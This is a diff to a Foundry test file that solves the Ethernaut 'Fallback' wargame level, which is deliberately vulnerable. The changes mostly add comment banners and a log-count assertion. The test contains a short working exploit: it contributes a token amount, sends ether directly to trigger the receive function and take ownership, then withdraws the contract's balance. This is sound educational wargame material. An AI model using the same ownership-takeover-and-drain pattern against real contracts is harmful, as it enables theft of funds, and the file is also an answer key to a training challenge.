@@ -18,13 +18,17 @@ contract FallbackTest is Test {
     address public immutable PLAYER = makeAddr("PLAYER");
 
     function setUp() public {
-        // Deploy ethernaut contract
+        // ----------------------------------
+        // Deploy Ethernaut contract
+        // ----------------------------------
         Statistics statistics = new Statistics();
         ethernaut = new Ethernaut();
         statistics.initialize(address(ethernaut));
         ethernaut.setStatistics(address(statistics));
 
-        // Register Fallback level
+        // ----------------------------------
+        // Register level
+        // ----------------------------------
         fallbackFactory = new FallbackFactory();
         ethernaut.registerLevel(fallbackFactory);
     }
@@ -35,22 +39,34 @@ contract FallbackTest is Test {
         vm.startPrank(PLAYER);
         vm.recordLogs();
 
-        // Create Fallback level instance
+        // ----------------------------------
+        // Create level instance
+        // ----------------------------------
         ethernaut.createLevelInstance(fallbackFactory);
         Vm.Log[] memory entries = vm.getRecordedLogs();
         target = IFallback(
             payable(address(uint160(uint256(entries[0].topics[2]))))
         );
-        vm.deal(address(target), 1000 ether);
 
+        // ----------------------------------
         // Initiate attack
+        // ----------------------------------
+        vm.deal(address(target), 1000 ether);
         vm.deal(PLAYER, 1 ether);
+
         target.contribute{value: 1}();
+
+        // Invoke receive function
         (bool success, ) = payable(address(target)).call{value: 1}("");
         require(success, "tx failed");
+
         target.withdraw();
 
+        // ----------------------------------
         // Validate
+        // ----------------------------------
         ethernaut.submitLevelInstance(payable(address(target)));
+        entries = vm.getRecordedLogs();
+        assertEq(entries.length, 2);
     }
 }
